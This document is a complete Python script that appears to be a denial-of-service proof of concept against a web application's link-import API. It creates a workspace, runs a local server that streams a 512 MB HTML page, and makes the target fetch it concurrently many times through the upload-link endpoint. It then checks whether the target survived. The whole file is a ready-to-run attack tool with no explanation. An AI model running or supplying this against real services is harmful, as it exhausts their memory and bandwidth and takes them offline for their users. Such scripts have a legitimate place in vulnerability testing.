import concurrent.futures
import json
import sys
import threading
import time
import urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer


target = sys.argv[1].rstrip("/")
workspace = sys.argv[2] if len(sys.argv) > 2 else "dos-url-lab"
concurrency = int(sys.argv[3]) if len(sys.argv) > 3 else 12
requests = int(sys.argv[4]) if len(sys.argv) > 4 else 12
size_mb = int(sys.argv[5]) if len(sys.argv) > 5 else 512
port = int(sys.argv[6]) if len(sys.argv) > 6 else 19092


class LargeHTMLHandler(BaseHTTPRequestHandler):
    def log_message(self, *_):
        pass

    def do_HEAD(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.send_header("Content-Length", str(size_mb * 1024 * 1024))
        self.end_headers()

    def do_GET(self):
        total = size_mb * 1024 * 1024
        chunk = (("<html><body>" + ("A" * 8192) + "</body></html>\n").encode() * 128)
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.send_header("Content-Length", str(total))
        self.end_headers()
        sent = 0
        while sent < total:
            data = chunk[: min(len(chunk), total - sent)]
            try:
                self.wfile.write(data)
                self.wfile.flush()
            except Exception:
                break
            sent += len(data)


def post_json(url, data, timeout=30):
    req = urllib.request.Request(
        url,
        data=json.dumps(data).encode(),
        method="POST",
        headers={"Content-Type": "application/json"},
    )
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        return resp.status, resp.read(200)


def ensure_workspace():
    try:
        status, body = post_json(target + "/api/workspace/new", {"name": workspace}, timeout=20)
        if status == 200:
            return json.loads(body.decode())["workspace"]["slug"]
    except Exception:
        pass
    return workspace


def import_url(i):
    url = "http://host.docker.internal:%d/huge.html?mb=%d" % (port, size_mb)
    started = time.time()
    try:
        post_json(target + "/api/workspace/%s/upload-link" % slug, {"link": url}, timeout=420)
        return "ok=True latency=%.3fs" % (time.time() - started)
    except Exception as e:
        return "ok=False latency=%.3fs detail=%r" % (time.time() - started, e)


def health():
    try:
        urllib.request.urlopen(target + "/api/ping", timeout=2).read()
        return True
    except Exception as e:
        return False, repr(e)


server = ThreadingHTTPServer(("0.0.0.0", port), LargeHTMLHandler)
threading.Thread(target=server.serve_forever, daemon=True).start()
slug = ensure_workspace()

print("[%s] url_import_start target='upload-link' requests=%d concurrency=%d remote_size=%dMB" %
      (time.strftime("%Y-%m-%d %H:%M:%S"), requests, concurrency, size_mb))

fails = 0
with concurrent.futures.ThreadPoolExecutor(max_workers=concurrency) as pool:
    for result in pool.map(import_url, range(requests)):
        if result.startswith("ok=False"):
            fails += 1
        print("[%s] %s" % (time.strftime("%Y-%m-%d %H:%M:%S"), result))

ok = health()
print("[%s] health_check=%r" % (time.strftime("%Y-%m-%d %H:%M:%S"), ok))
print("[%s] url_import_summary submitted=%d failed=%d" %
      (time.strftime("%Y-%m-%d %H:%M:%S"), requests, fails))
